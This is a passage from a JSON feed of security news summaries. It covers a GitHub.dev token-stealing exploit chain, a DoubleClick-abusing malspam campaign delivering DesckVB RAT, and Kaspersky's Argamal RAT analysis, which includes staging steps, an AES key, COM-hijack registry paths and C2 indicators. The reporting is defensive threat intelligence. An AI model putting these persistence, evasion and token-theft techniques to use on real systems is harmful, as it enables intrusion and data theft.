ploit can reliably trigger keybindings, it can add a keybinding for a VS Code command. The example given is installing an extension while skipping the trusted publisher check.\u003c/p\u003e\n\n\u003ch2 id=\"disclosure-and-response\"\u003eDisclosure and response\u003c/h2\u003e\n\n\u003cp\u003eThe article says GitHub was notified of the vulnerability on June 2, 2026. It also states that details of the issue were made public about an hour later, with the researcher citing Microsoft\u0026rsquo;s handling of VS Code-related bugs in the past. As of the article\u0026rsquo;s writing, Microsoft had acknowledged the vulnerability and said it was working on a fix.\u003c/p\u003e\n\n\u003cp\u003eAlexandru Dima, a partner software engineering manager at Microsoft, clarified that the issue does not affect VS Code Desktop.\u003c/p\u003e\n\n\u003ch2 id=\"key-affected-entities-and-components\"\u003eKey affected entities and components\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eGitHub.dev, the browser-based VS Code environment, is the primary product context described in the article.\u003c/li\u003e\n\u003cli\u003eMicrosoft Visual Studio Code is involved through its web-based environment, webviews, Command Palette behavior, keybindings, and local workspace extensions.\u003c/li\u003e\n\u003cli\u003eGitHub OAuth tokens are the credential type targeted by the attack.\u003c/li\u003e\n\u003cli\u003eGitHub repositories, including private repositories accessible to the user, are the stated potential exposure.\u003c/li\u003e\n\u003cli\u003eMicrosoft acknowledged the vulnerability and said it was working on a fix.\u003c/li\u003e\n\u003c/ul\u003e\n","keyPoints":["Cybersecurity researcher Ammar Askar disclosed a one-click attack via Microsoft Visual Studio Code that can steal a user's GitHub token.","The issue affects GitHub.dev, a lightweight web-based source code editor that launches a VS Code environment in the browser and receives an OAuth token from github.com.","The stolen GitHub OAuth token is not scoped to a single repository and can provide read and write access to all repositories the user can access, including private repositories.","The exploit uses malicious JavaScript inside an untrusted VS Code webview to simulate keypresses, open the Command Palette, and install an attacker-controlled extension that extracts the GitHub OAuth token.","Microsoft acknowledged the vulnerability and said it is working on a fix, while also clarifying that the issue does not affect VS Code Desktop."],"insights":["The GitHub.dev OAuth token described in the article is broadly scoped rather than limited to the repository being edited, making compromise of a single browser-based editor session much more damaging.","The exploit chain combines multiple legitimate VS Code behaviors, including webview message handling, simulated keybindings, the Command Palette, and local workspace extensions, rather than relying on a traditional malware download prompt.","Local workspace extensions are especially significant because VS Code can install them from a workspace’s .vscode/extensions folder without an additional publisher trust dialog.","The researcher publicly disclosed the issue about an hour after notifying GitHub, citing prior Microsoft handling of VS Code-related bugs."],"referencedReports":[{"title":"One-click account takeover in GitHub.dev","url":"https://blog.ammaraskar.com/github-token-stealing/","publisher":"Ammar Askar","context":"The article is based on Ammar Askar's disclosure describing a one-click GitHub.dev and VS Code attack that can steal GitHub OAuth tokens.","category":"","primary":false}],"body":"\u003cp\u003eCybersecurity researcher Ammar Askar disclosed a one-click attack involving Microsoft Visual Studio Code and GitHub.dev that can steal a user\u0026rsquo;s GitHub token. The article says a victim can expose a token capable of reading and writing to repositories, including private ones, by clicking a link. GitHub.dev is a lightweight web-based source code editor that launches a VS Code environment in the browser.\u003c/p\u003e\n\n\u003cp\u003eThe issue centers on how github.com posts an OAuth token to github.dev so the web editor can interact with GitHub on the user\u0026rsquo;s behalf. According to Askar, the token is not limited to the repository the user is working with and instead has full access to other repositories the user can access. The exploit abuses VS Code webviews and message-passing behavior to install a malicious extension that extracts the token.\u003c/p\u003e\n\n\u003cp\u003eThe attack runs malicious JavaScript inside an untrusted webview to simulate keypresses, open the Command Palette, and install an attacker-controlled extension. It also uses local workspace extensions placed under a workspace\u0026rsquo;s \u003ccode\u003e.vscode/extensions\u003c/code\u003e folder to bypass an additional trusted publisher prompt. Microsoft acknowledged the vulnerability and said it is working on a fix, while clarifying that VS Code Desktop is not affected.\u003c/p\u003e\n"},{"n":22,"title":"Google DoubleClick Abused in New Malspam Campaign to Deliver DesckVB RAT","source":"thehackernews.com","sourceColorIdx":8,"link":"https://thehackernews.com/2026/06/google-doubleclick-abused-in-new.html","time":"16:29","priority":"SHOULD READ","score":84,"tldr":"A new malspam campaign is abusing Google DoubleClick redirects to make phishing links look legitimate and deliver the DesckVB RAT. The attack uses dynamic victim-specific lures, JavaScript and PowerShell loaders, persistence, defense evasion, and process hollowing to gain remote control of infected Windows systems.","briefOverview":"\u003cp\u003eCybersecurity researchers have identified a new malspam campaign that abuses Google\u0026rsquo;s DoubleClick domain to evade detection and deliver DesckVB RAT. Huntress researchers said the campaign routes victims through a legitimate Google-owned domain before sending them toward attacker-controlled infrastructure. The campaign is notable because the lure can personalize itself using the victim\u0026rsquo;s email address, company branding, and location details.\u003c/p\u003e\n\n\u003cp\u003eThe infection begins when a user opens an HTML file attached to a phishing email, which redirects through a Google DoubleClick Campaign Manager click-tracking URL. The victim is then sent through another redirector to a landing page with a \u0026ldquo;Download PDF\u0026rdquo; button, which serves a ZIP archive when clicked. The archive triggers a JavaScript loader, PowerShell script, .NET loader, and ultimately the DesckVB RAT payload.\u003c/p\u003e\n\n\u003cp\u003eDesckVB RAT is a .NET-based remote access trojan active in the wild since February 2026. Once launched, it communicates with a command-and-control server over raw TCP sockets, performs reconnaissance, configures Microsoft Defender exclusions, patches AMSI and ETW, and establishes persistence. Huntress recommended defenses such as forcing script files to open in Notepad by default, deploying DMARC, DKIM, and SPF, and using email gateway sandboxing.\u003c/p\u003e\n","standardSynthesis":"\u003cp\u003eA new malspam campaign has been observed abusing Google\u0026rsquo;s DoubleClick domain as part of a delivery chain for DesckVB RAT. Huntress researchers Anna Pham and Adam Mooney said the campaign sends victims through DoubleClick before they reach attacker-controlled infrastructure. Because DoubleClick is a legitimate Google-owned domain, the researchers said security tools may be less likely to treat it as suspicious.\u003c/p\u003e\n\n\u003cp\u003eThe campaign is also notable for using a malspam kit that personalizes the lure dynamically. According to Huntress, the kit uses the victim\u0026rsquo;s email address to pull in company branding and location details, making the page appear more convincing. This removes the need for attackers to build a separate kit for each targeted organization, making the operation more scalable and cost-effective.\u003c/p\u003e\n\n\u003cp\u003eThe attack begins with an HTML file attached to a phishing email. When opened, the file triggers a meta-refresh browser redirect to a Google DoubleClick Campaign Manager click-tracking URL. From there, the victim is sent to another redirector, which decodes a Base64-encoded email address and leads to a landing page containing a \u0026ldquo;Download PDF\u0026rdquo; button.\u003c/p\u003e\n\n\u003cp\u003eClicking the button causes the server to return a ZIP archive that starts the infection chain. A JavaScript loader retrieves and executes additional components, extracting and running a PowerShell script that fetches a .NET loader from an external server. The loader acts as a stager that checks for analysis, neutralizes security controls, establishes persistence, and uses process hollowing to inject the RAT into Microsoft-signed processes.\u003c/p\u003e\n\n\u003cp\u003eDesckVB RAT communicates with a command-and-control server over raw TCP sockets and performs system reconnaissance. It configures Microsoft Defender exclusions, patches AMSI and ETW at the native API level, and persists through Run and RunOnce Registry entries as well as a loader placed in the user\u0026rsquo;s Startup folder. The trojan can extract data, run commands, deploy additional payloads, and terminate or reboot the machine if it detects analysis tools or a sandboxed environment.\u003c/p\u003e\n\n\u003cp\u003eHuntress framed the campaign as a reminder of the importance of defense in depth. The researchers recommended using a Group Policy Object to force script files such as .vbs, .hta, and .js to open in Notepad by default. They also recommended DMARC, DKIM, and SPF records, along with an email gateway capable of sandboxing attachments and links before delivery.\u003c/p\u003e\n","comprehensiveSynthesis":"\u003ch2 id=\"overview\"\u003eOverview\u003c/h2\u003e\n\n\u003cp\u003eCybersecurity researchers have flagged a new malspam campaign that abuses Google\u0026rsquo;s DoubleClick domain to help evade detection and deliver a remote access trojan named DesckVB RAT. The campaign was analyzed by Huntress researchers Anna Pham and Adam Mooney in a report shared with The Hacker News.\u003c/p\u003e\n\n\u003cp\u003eHuntress said the campaign routes victims through DoubleClick, a legitimate Google-owned domain, before they reach attacker-controlled infrastructure. The researchers noted that many security tools may be less likely to treat DoubleClick as suspicious.\u003c/p\u003e\n\n\u003ch2 id=\"why-the-campaign-is-notable\"\u003eWhy the Campaign Is Notable\u003c/h2\u003e\n\n\u003cp\u003eThe campaign does not rely on a bespoke phishing kit for each targeted organization. Instead, the malspam kit personalizes itself dynamically using the victim\u0026rsquo;s email address.\u003c/p\u003e\n\n\u003cp\u003eAccording to Huntress, the kit pulls in company branding and location details on the fly. This makes the landing page feel convincing without requiring the operators to handcraft a lure for every target.\u003c/p\u003e\n\n\u003cp\u003eThe article describes this as making the operation more scalable and cost-effective. The final objective is to deploy DesckVB RAT, a .NET-based trojan that has been active in the wild since February 2026.\u003c/p\u003e\n\n\u003ch2 id=\"initial-access-and-redirect-chain\"\u003eInitial Access and Redirect Chain\u003c/h2\u003e\n\n\u003cp\u003eThe attack starts when a user opens an HTML file attached to a phishing email. The HTML file triggers a meta-refresh browser redirect.\u003c/p\u003e\n\n\u003cp\u003eThe redirect sends the victim to a Google DoubleClick Campaign Manager click-tracking URL. From there, the victim is steered to another redirector.\u003c/p\u003e\n\n\u003cp\u003eThat redirector decodes a Base64-encoded email address and sends the victim to a landing page. The landing page contains a \u0026ldquo;Download PDF\u0026rdquo; button.\u003c/p\u003e\n\n\u003ch2 id=\"payload-delivery-chain\"\u003ePayload Delivery Chain\u003c/h2\u003e\n\n\u003cp\u003eWhen the victim clicks the \u0026ldquo;Download PDF\u0026rdquo; button, the server responds with a ZIP archive. That archive begins the rest of the infection chain.\u003c/p\u003e\n\n\u003cp\u003eThe article describes the next stage as a JavaScript loader. The loader\u0026rsquo;s main role is to retrieve and execute a .NET RAT while attempting to stay under the radar.\u003c/p\u003e\n\n\u003cp\u003eThe script extracts and runs a PowerShell script. The PowerShell script then fetches a .NET loader from an external server.\u003c/p\u003e\n\n\u003ch2 id=\"loader-behavior\"\u003eLoader Behavior\u003c/h2\u003e\n\n\u003cp\u003eThe .NET loader acts as a stager. It verifies that it is not being analyzed, neutralizes the machine\u0026rsquo;s security controls, and sets up persistence.\u003c/p\u003e\n\n\u003cp\u003eThe loader then downloads and runs the RAT payload. It does this using process hollowing, a technique that involves injecting malware into Microsoft-signed processes.\u003c/p\u003e\n\n\u003ch2 id=\"desckvb-rat-capabilities\"\u003eDesckVB RAT Capabilities\u003c/h2\u003e\n\n\u003cp\u003eOnce launched, DesckVB RAT communicates with a command-and-control server over raw TCP sockets. It performs system reconnaissance and configures Microsoft Defender exclusions.\u003c/p\u003e\n\n\u003cp\u003eThe trojan patches Antimalware Scan Interface, or AMSI, and Event Tracing for Windows, or ETW, at the native API level. The article says this is done at the outset in an effort to blind Windows telemetry before persistence is established.\u003c/p\u003e\n\n\u003cp\u003ePersistence is established through Run and RunOnce Registry entries. The malware also places a loader responsible for launching the RAT in the user\u0026rsquo;s Startup folder.\u003c/p\u003e\n\n\u003cp\u003eThe malware can extract data, run commands, and deploy additional payloads. These capabilities give attackers full control over infected machines.\u003c/p\u003e\n\n\u003ch2 id=\"evasion-and-anti-analysis-measures\"\u003eEvasion and Anti-Analysis Measures\u003c/h2\u003e\n\n\u003cp\u003eThe malware takes steps to avoid analysis and remain undetected. It can terminate and reboot the machine if it detects an analysis tool.\u003c/p\u003e\n\n\u003cp\u003eIt can also terminate and reboot the machine if it determines that it is running in a sandboxed environment. The loader also checks whether it is being analyzed before proceeding with later stages.\u003c/p\u003e\n\n\u003ch2 id=\"affected-parties-and-actors\"\u003eAffected Parties and Actors\u003c/h2\u003e\n\n\u003cp\u003eThe article does not name a specific threat actor or group behind the campaign. The affected users are recipients of phishing emails carrying the malicious HTML attachment.\u003c/p\u003e\n\n\u003cp\u003eGoogle DoubleClick and Google Campaign Manager are used as part of the redirect chain, but the article describes them as legitimate Google-owned infrastructure being abused. Microsoft technologies are also involved in the chain, including Microsoft Defender, AMSI, ETW, Windows Registry Run and RunOnce entries, and Microsoft-signed processes used for injection.\u003c/p\u003e\n\n\u003ch2 id=\"defensive-recommendations-from-huntress\"\u003eDefensive Recommendations from Huntress\u003c/h2\u003e\n\n\u003cp\u003eHuntress said the campaign is a strong reminder of why defense in depth matters. One recommended measure is configuring a Group Policy Object in Active Directory to force script files such as .vbs, .hta, and .js to open in Notepad by default.\u003c/p\u003e\n\n\u003cp\u003eHuntress said this could stop the threat actor at the first stage and prevent additional payloads from being dropped. On the email security side, organizations were advised to consider deploying DMARC, DKIM, and SPF records to reduce the likelihood of spoofed or malicious emails reaching users.\u003c/p\u003e\n\n\u003cp\u003eThe researchers also recommended using an email gateway solution that can sandbox attachments and links before delivery. This would add another layer of protection against the campaign\u0026rsquo;s attachment and link-based delivery methods.\u003c/p\u003e\n","keyPoints":["A new malspam campaign is using Google's DoubleClick domain to evade detection and deliver the .NET-based DesckVB RAT.","The attack begins with an HTML attachment in a phishing email that redirects victims through a Google DoubleClick Campaign Manager click-tracking URL to a malicious landing page.","The landing page personalizes itself using the victim's email address by dynamically pulling in company branding and location details.","Clicking the landing page's \"Download PDF\" button downloads a ZIP archive that launches a JavaScript loader, PowerShell script, .NET loader, and ultimately the RAT payload.","DesckVB RAT communicates with a command-and-control server over raw TCP sockets, performs reconnaissance, configures Microsoft Defender exclusions, patches AMSI and ETW, establishes persistence, and can extract data, run commands, and deploy additional payloads."],"insights":["Routing victims through Google DoubleClick before attacker-controlled infrastructure exploits trust in a legitimate Google-owned domain that security tools may be less likely to flag.","The malspam kit’s ability to generate company branding and location details from the victim’s email address makes the campaign scalable without handcrafting lures for each target.","A Group Policy Object that forces script files such as .vbs, .hta, and .js to open in Notepad by default could stop this infection chain at its first executable stage.","DesckVB RAT patches AMSI and ETW at the native API level before establishing persistence, showing that the malware prioritizes blinding Windows telemetry early in execution."],"referencedReports":[{"title":"Malspam to DeskCVB RAT Delivery Chain Analysis","url":"https://www.huntress.com/blog/malspam-to-deskcvb-rat-delivery-chain-analysis","publisher":"Huntress","context":"The article cites a Huntress report by Anna Pham and Adam Mooney analyzing the malspam campaign that abuses Google DoubleClick redirects to deliver DesckVB RAT.","category":"","primary":false}],"body":"\u003cp\u003eCybersecurity researchers have identified a new malspam campaign that abuses Google\u0026rsquo;s DoubleClick domain to evade detection and deliver DesckVB RAT. Huntress researchers said the campaign routes victims through a legitimate Google-owned domain before sending them toward attacker-controlled infrastructure. The campaign is notable because the lure can personalize itself using the victim\u0026rsquo;s email address, company branding, and location details.\u003c/p\u003e\n\n\u003cp\u003eThe infection begins when a user opens an HTML file attached to a phishing email, which redirects through a Google DoubleClick Campaign Manager click-tracking URL. The victim is then sent through another redirector to a landing page with a \u0026ldquo;Download PDF\u0026rdquo; button, which serves a ZIP archive when clicked. The archive triggers a JavaScript loader, PowerShell script, .NET loader, and ultimately the DesckVB RAT payload.\u003c/p\u003e\n\n\u003cp\u003eDesckVB RAT is a .NET-based remote access trojan active in the wild since February 2026. Once launched, it communicates with a command-and-control server over raw TCP sockets, performs reconnaissance, configures Microsoft Defender exclusions, patches AMSI and ETW, and establishes persistence. Huntress recommended defenses such as forcing script files to open in Notepad by default, deploying DMARC, DKIM, and SPF, and using email gateway sandboxing.\u003c/p\u003e\n"},{"n":23,"title":"Argamal: Malware hidden in hentai games","source":"securelist.com","sourceColorIdx":5,"link":"https://securelist.com/argamal-rat-distributed-with-hentai-games/119999/","time":"09:00","priority":"SHOULD READ","score":84,"tldr":"Kaspersky uncovered Argamal, a new RAT campaign hiding in trojanized hentai games that uses PowerShell, COM hijacking, and delayed payload downloads to gain persistence and full remote control of victims’ Windows systems. The campaign has infected hundreds of users, mainly in Russia, Brazil, Germany, and Vietnam.","briefOverview":"\u003cp\u003eIn April 2026, Kaspersky discovered a malware campaign targeting players of hentai games. The infected games install a previously unknown malicious implant, later named Argamal. After a few days, the implant downloads and executes a Trojan that gives attackers broad remote control capabilities and can fully compromise the system.\u003c/p\u003e\n\n\u003cp\u003eThe trojanized games were distributed through dedicated websites that redirected users to PixelDrain, as well as through torrent trackers including AniRena. The archives contained legitimate, functional game files alongside modified or patched components used to load the malware. Kaspersky telemetry showed hundreds of infected individuals, with most victims located in Russia, Brazil, Germany, and Vietnam.\u003c/p\u003e\n\n\u003cp\u003eArgamal uses PowerShell scripts, delayed execution, and COM hijacking for persistence. It abuses the Windows Color System Calibration Loader scheduled task by setting a malicious DLL as the InprocServer32 value for a COM object that runs at user logon. The final payload is a RAT capable of executing commands, taking screenshots, controlling the mouse, managing files, collecting system information, and communicating with C2 infrastructure.\u003c/p\u003e\n","standardSynthesis":"\u003cp\u003eKaspersky reported a malware campaign discovered in April 2026 that targets players of hentai games. Once launched, the infected games install a malicious implant that later downloads and executes a Trojan, resulting in full system compromise. Kaspersky named the malware family Argamal and detects it as Trojan.Win32.Termixia.\u003cem\u003e, Trojan.Win32.Agent.\u003c/em\u003e, HEUR:Trojan.Win32.Argamal.gen, and HEUR:Trojan-Downloader.Win32.Argamal.gen.\u003c/p\u003e\n\n\u003cp\u003eThe malicious games were delivered through dedicated adult game websites and torrent trackers, including AniRena. The websites hosted screenshots and download links that redirected users to PixelDrain, a free file transfer service. The delivered archives contained legitimate, functional game files as well as modified components, such as a patched FFmpeg DLL that imported DllGetClassObject from natives2_blob.bin.\u003c/p\u003e\n\n\u003cp\u003eThe natives2_blob.bin file executes a Base64-encoded PowerShell script called Stage1 when loaded. Stage1 checks for controlled environments, including Sandboxie and Procmon64, then stores another Base64-encoded PowerShell script in user environment variables such as MI_V and MI_V2. It also creates a scheduled task that runs three days later and prepares registry values used for later persistence.\u003c/p\u003e\n\n\u003cp\u003eStage2 downloads an encrypted payload named zaesdl.dat from GitHub using bitsadmin.exe, saves it as settings.dat, and decrypts it with AES-CBC using the key zbcd1j9234r670eh and the same value as the IV. The decrypted payload is written as a DLL and configured as the InprocServer32 value for CLSID {B210D694-C8DF-490D-9576-9E20CDBC20BD}. This COM object is used by the Microsoft Windows WindowsColorSystem Calibration Loader scheduled task, which runs when the user logs in.\u003c/p\u003e\n\n\u003cp\u003eThe final payload is a RAT with broad functionality. It sends UDP heartbeats to C2 servers, can receive commands to run DLLs, execute commands, open files or links, delete files, update C2 domains, and retrieve new payloads. In extended RAT mode, it communicates over TCP and supports commands for rebooting or shutting down the system, taking screenshots, file operations, reconnaissance, cursor control, and command execution.\u003c/p\u003e\n\n\u003cp\u003eKaspersky telemetry indicated hundreds of infections, mostly in Russia, Brazil, Germany, and Vietnam. The observed C2 infrastructure included asper1.freeddns.org, Winst0.kozow.com, country1.ignorelist.com, and 186.158.223.35. Kaspersky assessed with medium confidence that the developer of the downloader chain speaks Spanish, based on Spanish-language variable names, comments, infrastructure data, and other facts, while also noting locale-based behavior affecting zh-CN systems.\u003c/p\u003e\n","comprehensiveSynthesis":"\u003ch2 id=\"overview\"\u003eOverview\u003c/h2\u003e\n\n\u003cp\u003eKaspersky discovered a malware campaign in April 2026 targeting players of hentai games. The infected games install a previously unknown malicious implant that Kaspersky named Argamal. After a few days, the implant downloads and executes a Trojan, leading to full system compromise and broad remote control capabilities for the attackers.\u003c/p\u003e\n\n\u003cp\u003eKaspersky said variants of suspicious DLLs associated with the activity had existed since at least 2024. The DLLs were launched by different games built with multiple engines and languages, including RenPy and RPG Maker MV. The shared feature across the observed cases was that the games were hentai games.\u003c/p\u003e\n\n\u003ch2 id=\"distribution-and-delivery\"\u003eDistribution and Delivery\u003c/h2\u003e\n\n\u003cp\u003eKaspersky found that the trojanized games were distributed through several sources. Some dedicated websites hosted game screenshots and download links that redirected users to PixelDrain, a free file transfer service. The infected games were also distributed through torrent trackers, including AniRena.\u003c/p\u003e\n\n\u003cp\u003eThe delivered archives contained legitimate, fully functional game files along with maliciously modified components. In one delivery chain, the archive included a modified FFmpeg DLL with SHA1 hash 42add9475e67a1ccc6a6af94b5475d3defc01b85. This DLL imported the DllGetClassObject function from a file named natives2_blob.bin, and because the game required ffmpeg.dll to run, the malicious loading chain began when the user launched the game.\u003c/p\u003e\n\n\u003cp\u003eKaspersky also observed other delivery methods. In some cases, attackers included the main payload as libpython64.dat or a similarly named file in the lib\\py3-windows-x86_64 directory of the game. That .dat file was loaded by a patched library used by the game. In another case, the threat actor posted a malicious DLL payload downloader on a gaming forum while disguising it as a cheat.\u003c/p\u003e\n\n\u003ch2 id=\"initial-script-execution\"\u003eInitial Script Execution\u003c/h2\u003e\n\n\u003cp\u003eThe natives2_blob.bin file, with SHA1 hash edce72f59e4c1d136cd1946af70d334c19df858d, is a DLL that executes a Base64-encoded PowerShell script when loaded. Kaspersky refers to this script as Stage1. Stage1 performs basic checks for controlled environments, including checking for a Sandboxie folder in Program Files and Procmon64 in the process list.\u003c/p\u003e\n\n\u003cp\u003eIf the checks indicate that the malware is not running in a controlled environment, Stage1 proceeds to establish persistence. It stores another Base64-encoded PowerShell script, called Stage2, in the MI_V environment variable for the current user. Newer malware versions also use the MI_V2 environment variable.\u003c/p\u003e\n\n\u003cp\u003eStage1 then sets the InprocServer32 registry key at HKCU\\SOFTWARE\\Classes\\CLSID{722D0F89-B69C-4700-AE8C-4A44350E4876} to a random DLL filename in a random subdirectory of %USER%\\AppData\\Local. It also sets the ShellFolder subkey to another random DLL filename in the same location. Stage1 creates a scheduled task that executes Stage2 once, three days later.\u003c/p\u003e\n\n\u003ch2 id=\"payload-download-and-persistence\"\u003ePayload Download and Persistence\u003c/h2\u003e\n\n\u003cp\u003eStage2 is a payload downloader script. It uses previously generated DLL filenames from the registry and downloads an encrypted payload named zaesdl.dat from GitHub using bitsadmin.exe. The encrypted payload is saved as settings.dat in the randomly chosen subdirectory of %USER%\\AppData\\Local.\u003c/p\u003e\n\n\u003cp\u003eStage2 decrypts the downloaded payload using AES-CBC. The key is zbcd1j9234r670eh, and the IV is equal to the key. The decrypted payload is saved in the DLL file specified in the ShellFolder registry subkey.\u003c/p\u003e\n\n\u003cp\u003eThe decrypted payload is then configured as InprocServer32 at HKCU\\SOFTWARE\\Classes\\CLSID{B210D694-C8DF-490D-9576-9E20CDBC20BD}. This CLSID corresponds to a COM object used by the \\Microsoft\\Windows\\WindowsColorSystem\\Calibration Loader scheduled task. Because that task runs every time a user logs in, the malware gains execution during every user session.\u003c/p\u003e\n\n\u003cp\u003eBefore exiting, Stage2 cleans up earlier setup artifacts. It removes changes under HKCU\\SOFTWARE\\Classes\\CLSID{722D0F89-B69C-4700-AE8C-4A44350E4876}, unsets MI_V and, in newer versions, MI_V2, and removes the scheduled task that launched Stage2.\u003c/p\u003e\n\n\u003ch2 id=\"rat-payload-characteristics\"\u003eRAT Payload Characteristics\u003c/h2\u003e\n\n\u003cp\u003eEarly payload versions decrypted themselves using a rolling XOR key of 0xB0C1D4E9, where the decryption key for each next four-byte block was the encrypted content of the previous block. Kaspersky said the most recent agent versions no longer use this mechanism.\u003c/p\u003e\n\n\u003cp\u003eThe samples Kaspersky analyzed used string encryption based on substitution. The substitution keys corresponded position by position to the alphabet ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$./:\u0026lt;\u0026gt;*\u0026amp;~, while symbols not used in the key remained unchanged. Kaspersky found three different substitution keys used during the investigation.\u003c/p\u003e\n\n\u003cp\u003eThe payload checks for security solutions by parsing the output of the tasklist command. The list includes Kaspersky, Avast, McAfee, BitDefender, MalwareBytes, and 36 other solutions.\u003c/p\u003e\n\n\u003ch2 id=\"command-and-control-infrastructure\"\u003eCommand-and-Control Infrastructure\u003c/h2\u003e\n\n\u003cp\u003eThe default C2 server was asper1.freeddns.org in earlier versions and Winst0.kozow.com in the latest payload versions. Both domains pointed to 186.158.223.35 during the investigation. Kaspersky also observed another IP address for the first C2 in passive DNS records, although it had not seen that address in use.\u003c/p\u003e\n\n\u003cp\u003eThe C2 address can change based on C2 replies or specific conditions. For example, if the user’s default locale is zh-CN, the RAT sets its C2 address to country1.ignorelist.com. During most of Kaspersky’s investigation, this domain pointed to 127.0.0.1, but from April 26 it also pointed to 186.158.223.35.\u003c/p\u003e\n\n\u003cp\u003eThe infrastructure listed by Kaspersky included:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003easper1.freeddns.org, associated with 181.116.218.56 and 186.158.223.35.\u003c/li\u003e\n\u003cli\u003ecountry1.ignorelist.com, associated with 186.158.223.35 and 127.0.0.1.\u003c/li\u003e\n\u003cli\u003eWinst0.kozow.com, associated with 186.158.223.35.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eKaspersky also listed GitHub repositories used in the campaign, including hxxps://github.com/gmz159/u, hxxps://github.com/DnyP/files, and hxxps://github.com/mgzv/p.\u003c/p\u003e\n\n\u003ch2 id=\"udp-and-tcp-rat-capabilities\"\u003eUDP and TCP RAT Capabilities\u003c/h2\u003e\n\n\u003cp\u003eThe payload sends UDP heartbeats to port 57441 of the C2 server. These heartbeats include information about detected security solutions, system startup time, time since last input activity, architecture information, machine IP address, and username.\u003c/p\u003e\n\n\u003cp\u003eThe C2 may respond to the heartbeat with commands. The available UDP response commands include actions to run a DLL, send a UDP request to a specified address, open a file or link, collect system information, execute commands with ShellExecuteW, run a file with WinExec, delete a file, update the C2 domain, or retrieve a new DLL payload through UDP port 63559.\u003c/p\u003e\n\n\u003cp\u003eThe C2 can also enable an extended RAT mode. In that mode, the malware communicates with the C2 server over TCP port 3747. TCP communications are encrypted using a simple substitution cipher based on a fixed key mapped to a standard ASCII character sequence.\u003c/p\u003e\n\n\u003cp\u003eBefore receiving information from the C2 in TCP mode, the malware sends metadata using the NOOP command. This metadata includes a run cycle counter, mounted drive metadata, time since last input activity, and display settings information.\u003c/p\u003e\n\n\u003cp\u003eThe extended RAT mode supports broad system control, surveillance, file operations, reconnaissance, and command execution. Kaspersky listed commands that allow the attacker to reboot or shut down the system, exit the malware process, take screenshots, delete or move files, create directories, compress files or folders into ZIP or TAR archives, read or set file timestamps, download or upload files, list directories, query OS information, run commands, create and run tasks, press keys, and control or freeze the mouse.\u003c/p\u003e\n\n\u003ch2 id=\"victims-and-impact\"\u003eVictims and Impact\u003c/h2\u003e\n\n\u003cp\u003eKaspersky telemetry showed hundreds of individuals infected with Argamal. The majority of victims were located in Russia, Brazil, Germany, and Vietnam.\u003c/p\u003e\n\n\u003cp\u003eThe impact described by Kaspersky is full system compromise. The campaign’s final payload is a RAT that can provide remote control of the infected device. Kaspersky said the campaign’s goal is likely data and credential theft, while noting that the RAT allows the attacker to fully control the device and carry out any malicious activity they want.\u003c/p\u003e\n\n\u003ch2 id=\"attribution-indicators\"\u003eAttribution Indicators\u003c/h2\u003e\n\n\u003cp\u003eKaspersky assessed with medium confidence that the developer of the downloader chain speaks Spanish. The assessment was based on Spanish-language comments and variable names in code, infrastructure data, and other facts.\u003c/p\u003e\n\n\u003cp\u003eThe Base64-decoded delivery script contained Spanish-language content, and JavaScript code from the website distributing infected games also used Spanish variable names, function names, and comments. Kaspersky also noted that malware payloads previously selected 127.0.0.1 as the C2 server when the victim’s default locale was zh-CN, which meant the payload did not target Chinese users at that time.\u003c/p\u003e\n\n\u003cp\u003eKaspersky said this zh-CN behavior may indicate that the attacker is associated with a Chinese-speaking threat actor or uses payloads developed by a Chinese-speaking threat actor. However, Kaspersky stated that it still believes it is unlikely the developer of the delivery chains is Chinese-speaking.\u003c/p\u003e\n\n\u003ch2 id=\"detection-and-indicators\"\u003eDetection and Indicators\u003c/h2\u003e\n\n\u003cp\u003eKaspersky products detect the threat under several names:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eTrojan.Win32.Termixia.*\u003c/li\u003e\n\u003cli\u003eTrojan.Win32.Agent.*\u003c/li\u003e\n\u003cli\u003eHEUR:Trojan.Win32.Argamal.gen\u003c/li\u003e\n\u003cli\u003eHEUR:Trojan-Downloader.Win32.Argamal.gen\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThe article includes hashes for RAT payloads and Trojan downloaders, along with domains, IPs, and GitHub repositories used in the campaign. Kaspersky said its solutions prevented the malicious activity in the earliest stages of the attack by identifying known threats as well as software behavior and actions.\u003c/p\u003e\n\n\u003ch2 id=\"conclusion\"\u003eConclusion\u003c/h2\u003e\n\n\u003cp\u003eArgamal is a newly identified RAT campaign targeting individuals seeking adult games. It uses trojanized game packages, modified DLL loading chains, PowerShell-based staging, delayed execution, GitHub-hosted encrypted payloads, and COM hijacking of a Windows scheduled task for persistence.\u003c/p\u003e\n\n\u003cp\u003eKaspersky observed a steady stream of updates to the payload, including new features, bug fixes, and infrastructure changes. The article concludes that the threat actor behind Argamal is likely to continue developing and enhancing the malware.\u003c/p\u003e\n","keyPoints":["Kaspersky discovered a malware campaign in April 2026 targeting players of hentai games with a previously unknown malicious implant called Argamal.","The trojanized games were distributed through dedicated websites, PixelDrain links, and torrent trackers including AniRena.","Argamal uses PowerShell scripts and COM hijacking of the Windows Color System Calibration Loader scheduled task to establish persistence and run at user logon.","The payload is a RAT that can execute commands, take screenshots, manage files, reboot or shut down the system, control the cursor, and communicate with C2 infrastructure.","Kaspersky telemetry showed hundreds of infections, with most victims located in Russia, Brazil, Germany, and Vietnam."],"insights":["Argamal delays execution of its downloader stage by creating a scheduled task that runs three days later, which may help it avoid immediate detection after the trojanized game is launched.","The malware stores Base64-encoded PowerShell payloads in user environment variables such as MI_V and MI_V2 before later removing them, making environment variable inspection relevant during incident response.","The persistence mechanism abuses the COM object used by the Microsoft Windows Color System Calibration Loader task, specifically CLSID {B210D694-C8DF-490D-9576-9E20CDBC20BD}, which runs when a user logs in.","The RAT changes its C2 behavior when the victim locale is zh-CN, using country1.ignorelist.com, which resolved to 127.0.0.1 for much of the investigation before later pointing to the same active C2 IP.","The campaign used multiple delivery variations, including patched FFmpeg DLLs, patched game libraries loading libpython64.dat-like payload files, and a gaming forum post disguising a malicious DLL as a cheat."],"referencedReports":[],"body":"\u003cp\u003eIn April 2026, Kaspersky discovered a malware campaign targeting players of hentai games. The infected games install a previously unknown malicious implant, later named Argamal. After a few days, the implant downloads and executes a Trojan that gives attackers broad remote control capabilities and can fully compromise the system.\u003c/p\u003e\n\n\u003cp\u003eThe trojanized games were distributed through dedicated websites that redirected users to 